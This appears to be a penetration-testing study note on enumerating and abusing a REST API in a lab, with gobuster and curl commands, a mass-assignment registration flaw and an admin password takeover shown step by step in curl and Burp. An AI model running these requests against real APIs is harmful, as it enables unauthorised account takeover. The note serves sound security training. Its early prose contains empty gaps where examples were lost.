---
tags:
  - phase/enumeration
  - api
  - web
---

# Enumerating and Abusing APIs

> [!tip] Quick Reference — API Enumeration
> | Goal | Command |
> |------|---------|
> | Brute force versioned endpoints | `gobuster dir -u http://<IP>:<port> -w big.txt -p pattern` |
> | Check for Swagger/OpenAPI docs | `curl -s http://<IP>:<port>/swagger.json` |
> | Probe allowed methods (no side effects) | `curl -X OPTIONS -i http://<IP>:<port>/<path>` |
> | Inspect an endpoint | `curl -i http://<IP>:<port>/<path>` |
> | Send JSON POST | `curl -d '{"key":"val"}' -H 'Content-Type: application/json' <url>` |
> | Force a different method | `curl -X PUT -d '{}' -H 'Content-Type: application/json' <url>` |
> | Route requests through Burp | `curl --proxy 127.0.0.1:8080 <url>` |

In many cases, our penetration test target is an internally built, closed-source web application that is shipped with a number of Application Programming Interfaces (API). These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.

A specific type of API named Representational State Transfer (REST) is used for a variety of purposes, including authentication.

In a typical white-box test scenario, we would receive complete API documentation to help us fully map the attack surface. However, when performing a black-box test, we'll need to discover the target's API ourselves.

We can use Gobuster features to brute force the API endpoints. In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.

API paths are often followed by a version number, resulting in a pattern such as:



The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.

With this information, let's try brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:




In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number. To keep our test simple, we'll try with only two versions.






Let's first inspect the /users API with curl.










Interestingly, instead of a 404 Not Found response code, we received a 405 METHOD NOT ALLOWED, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the password API through a different method, such as POST or PUT.

Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).

Before attempting a different method, let's verify if the overwritten credentials are accepted. We can check if the login method is supported by extending our base URL as follows:





Although we were presented with a 404 NOT FOUND message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a proper way to interact with it.

We know one of the usernames is admin, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense.

Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON format. Let's craft our request by first passing the admin username and dummy password as JSON data via the -d parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with -H.




Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface.

Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:










We were able to correctly sign in and retrieve a JSON Web Token (JWT) authentication token. To obtain tangible proof that we are an administrative user, we should use this token to change the admin user password.




Unfortunately, the application indicates that the HTTP method is unsupported, so we’ll try an alternative. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:







These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs, often due to lack of testing and secure coding best practices.

So far, we have relied on curl to manually assess the target's API so that we could get a better sense of the entire traffic flow.

This approach, however, will not properly scale whenever the number of APIs becomes significant. Luckily, we can recreate all the above steps from within Burp.

As an example, let's replicate the latest admin login attempt and send it to the proxy by appending the --proxy 127.0.0.1:8080 to the command. Once done, from Burp's Repeater tab, we can create a new empty request and fill it with the same data as we did previously.



Great! We were able to recreate the same behavior within our proxy, which, among other advantages, enables us to store any tested APIs in its database for later investigation.

Once we've tested several different APIs, we could navigate to the Target tab and then Site map. We can then retrieve the entire map of the paths we have been testing so far.

> [!info] API path naming convention
> REST endpoints commonly follow the pattern `/api_name/v1`, where a descriptive name is followed by a version number (e.g. `/users/v1`, `/books/v2`).


```sh
{GOBUSTER}/v1
{GOBUSTER}/v2
```


Enumerate the API paths with Gobuster's pattern feature:

```sh
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

Interesting hits from the output:

```
/books/v1   (Status: 200) [Size: 235]
/console    (Status: 200) [Size: 1985]
/ui         (Status: 301) [--> http://192.168.50.16:5001/ui/]
/users/v1   (Status: 200) [Size: 241]
```

`/books/v1` and `/users/v1` are the two API endpoints worth investigating.


> [!info] Tip
> Browsing to the `/ui` path often exposes the full API documentation (e.g. a Swagger UI). This is common in white-box testing but rarely available in a black-box test.

> [!tip] Check for Swagger/OpenAPI docs before brute forcing
> Many frameworks expose a machine-readable spec at a predictable path — if one of these responds, it hands you a complete map of every endpoint, parameter, and expected schema, no wordlist needed:
> ```sh
> curl -s http://<IP>:<port>/swagger.json
> curl -s http://<IP>:<port>/swagger-ui.html
> curl -s http://<IP>:<port>/openapi.json
> curl -s http://<IP>:<port>/api-docs
> curl -s http://<IP>:<port>/v2/api-docs
> ```

> [!tip] Probing methods without triggering side effects
> Before guessing methods one by one with real payloads, send an `OPTIONS` request — the `Allow:` response header lists every method the endpoint supports, with no risk of actually changing data:
> ```sh
> curl -X OPTIONS -i http://192.168.50.16:5002/users/v1/admin/password
> ```
> Look for `Allow: GET, POST, PUT, OPTIONS` (or similar) in the response headers.


Inspect the `/users/v1` endpoint:

```sh
curl -i http://192.168.50.16:5002/users/v1
```

It returns `200 OK` with a JSON list of accounts, including an `admin` user:

```json
{"users": [
  {"email": "mail1@mail.com", "username": "name1"},
  {"email": "mail2@mail.com", "username": "name2"},
  {"email": "admin@mail.com", "username": "admin"}
]}
```

Next, expand the path with the `admin` username (`/users/v1/admin/`) and brute force it to find further sub-properties.


Brute force the admin sub-paths:

```sh
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

Two sub-endpoints return `405` (path exists, GET not allowed):

```
/email      (Status: 405)
/password   (Status: 405)
```


Probe the `password` sub-path directly:

```sh
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

It returns `405 METHOD NOT ALLOWED` (`"The method is not allowed for the requested URL."`) — the endpoint exists, but GET is not supported. This hints that a different method (POST/PUT/PATCH) may change the admin password.


Check whether a `login` endpoint exists:

```sh
curl -i http://192.168.50.16:5002/users/v1/login
```

It returns `404 NOT FOUND` but with the body `{"status": "fail", "message": "User not found"}` — the API itself exists; we just need to send it valid parameters.


Send a POST login with a dummy password to confirm the request format:

```sh
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

Response: `{"status": "fail", "message": "Password is not correct for the given username."}` — the JSON parameters are correct, only the password is wrong.


Try registering a new user via the `register` endpoint:

```sh
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```

Response: `{"status": "fail", "message": "'email' is a required property"}` — registration works but also needs an `email` field.


Now include the required `email`, and also add an undocumented `admin` key set to `True` to test for a mass-assignment / privilege escalation flaw:

```sh
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

Response: `{"status": "success", "message": "Successfully registered. Login to receive an auth token."}` — the server accepted the `admin` flag, which it should never have done.


Log in with the account we just created to obtain an auth token:

```sh
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

Response: `{"auth_token": "eyJ0eXAiOiJKV1Q...", "message": "Successfully logged in.", "status": "success"}` — we now hold a JWT for our admin-flagged user. Use it to change the real admin's password.


Attempt to change the admin password with a POST, passing the JWT in the `Authorization` header and the new password in the body:

```sh
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```

The POST is rejected with `405 Method Not Allowed`, so try the `PUT` method (often used to replace a value) instead:

```sh
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

The PUT returns no error, so the backend likely accepted the change. Confirm the takeover by logging in as `admin` with the new password:

```sh
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

Login succeeds and returns a valid `auth_token` for `admin` — the account is taken over via a logical privilege-escalation bug in the registration API.


> [!example] Replicating the request in Burp Repeater
> In Repeater, build the same POST manually:
> ```http
> POST /users/v1/login HTTP/1.1
> Host: 192.168.50.16:5002
> Content-Type: application/json
>
> {"password": "pwned", "username": "admin"}
> ```
> Click Send; the right pane shows `HTTP/1.0 200 OK` with the `auth_token` in the JSON body — the same result as curl, now stored in Burp for later use.

> [!info] Organizing API testing with the Site map
> Under Target -> Site map, Burp records every path you have touched (POST `/users/v1/login`, POST `/users/v1/register`, etc.). From there you can send any saved request to Repeater or Intruder for further testing.

## Visual Flow

```mermaid
flowchart TD
    A[API server on a port e.g. 5002] --> B["gobuster dir -u http://IP:5002 -w big.txt -p pattern"]
    B --> C{Endpoints found?}
    C -->|"/users/v1, /books/v1"| D["curl -i http://IP:5002/users/v1"]
    D --> E{Response code?}
    E -->|"200 OK lists users"| F[Note usernames e.g. admin]
    E -->|"405 Method Not Allowed"| G[Path exists, try POST/PUT/PATCH]
    G --> H["curl -X PUT -H 'Content-Type: application/json' -d data URL"]
    F --> I[Try register with extra admin:true field]
    I --> J["Login to get JWT auth_token, then abuse it"]
```

> [!success] What success looks like
> `curl -i .../users/v1` returns `HTTP/1.0 200 OK` with a JSON list of accounts including `admin`. A `405 METHOD NOT ALLOWED` is also a win — it confirms the path exists but your HTTP method is wrong, so switch to POST/PUT. Eventually a register/login returns `"auth_token": "eyJ..."` (a JWT) proving account takeover.

> [!danger] Common errors
> - 404 everywhere → wrong port or missing the API version; use the gobuster `-p` pattern file with `{GOBUSTER}/v1` and `{GOBUSTER}/v2`.
> - POST data ignored / 400 errors → you forgot the JSON header; add `-H 'Content-Type: application/json'` and pass valid JSON via `-d`.
> - 405 on GET → do not give up; the endpoint is real, retry with `-X POST` or `-X PUT`.
> - HTTPS API cert error → add `-k` to curl.
> - `401 Unauthorized` / `token expired` after using a saved JWT → tokens carry an `exp` claim; re-run the login request to mint a fresh `auth_token` rather than reusing an old one from notes.
> - Generic gobuster wordlist finds nothing under `/api/` → switch to an API-specific list, e.g. `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` or `objects.txt`.
> Full list: [[⚠️ Common Errors & Troubleshooting]]

> [!tip] Beginner note
> An **API** is how the front-end talks to the back-end using plain HTTP requests that return JSON instead of web pages. The status code is your guide: `200` = it worked, `404` = not found, `405` = path exists but wrong method (try POST/PUT). A returned **JWT** (`eyJ...`) is a login token you can reuse in an `Authorization` header.

---
%% graph-links %%
## Related
- [[Security Testing with Burp Suite]]
- [[Open-Source Code]]
- [[Command Injection]]

> [!info] Navigation
> Section: [[Web Applications/Enumeration/_index|Enumeration]] · Home: [[🏠 Home]]

